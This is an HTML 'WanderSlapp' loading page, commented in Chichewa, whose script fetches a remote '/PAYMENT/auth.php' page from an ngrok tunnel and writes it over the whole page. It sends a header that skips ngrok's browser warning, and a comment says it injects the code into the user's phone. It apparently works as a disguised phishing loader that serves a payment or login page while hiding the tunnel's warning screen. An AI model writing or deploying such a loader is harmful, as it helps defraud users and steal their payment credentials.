<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>WanderSlapp</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background-color: #121212;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            font-family: Arial, sans-serif;
            color: white;
        }
        .loader { text-align: center; }
    </style>
</head>
<body>

    <div class="loader" id="loading-text">
        <h2>Loading WanderSlapp...</h2>
    </div>

    <script>
        // Kalinki kanu kosasintha ka Ngrok (Gwiritsani ntchito HTTPS)
        const NGROK_URL = "https://rebuilt-suburb-these.ngrok-free.dev/PAYMENT/auth.php";

        // KUGWIRISITSA NTCHITO "XMLHttpRequest" M'MALO MWA FETCH 
        // Izi zimathandiza kuika ma custom headers popanda masakatuli ena kukana chifukwa cha CORS
        var xhr = new XMLHttpRequest();
        xhr.open("GET", NGROK_URL, true);
        
        // Ichi ndicho chinsinsi chomwe Ngrok inanena chija, tikuchitumiza mwaukatswiri:
        xhr.setRequestHeader("ngrok-skip-browser-warning", "any-value");
        
        xhr.onreadystatechange = function () {
            if (xhr.readyState === 4) {
                if (xhr.status === 200) {
                    // Ngati zinthu zayenda bwino, tikulowetsa code ya PHP mu foni ya user
                    document.open();
                    document.write(xhr.responseText);
                    document.close();
                } else {
                    document.getElementById('loading-text').innerHTML = "<h2>Network error. Chonde tsegulani kachiwiri.</h2>";
                }
            }
        };
        
        xhr.onerror = function() {
            document.getElementById('loading-text').innerHTML = "<h2>Network error. Chonde yesani kachiwiri.</h2>";
        };
        
        xhr.send();
    </script>
</body>
</html>
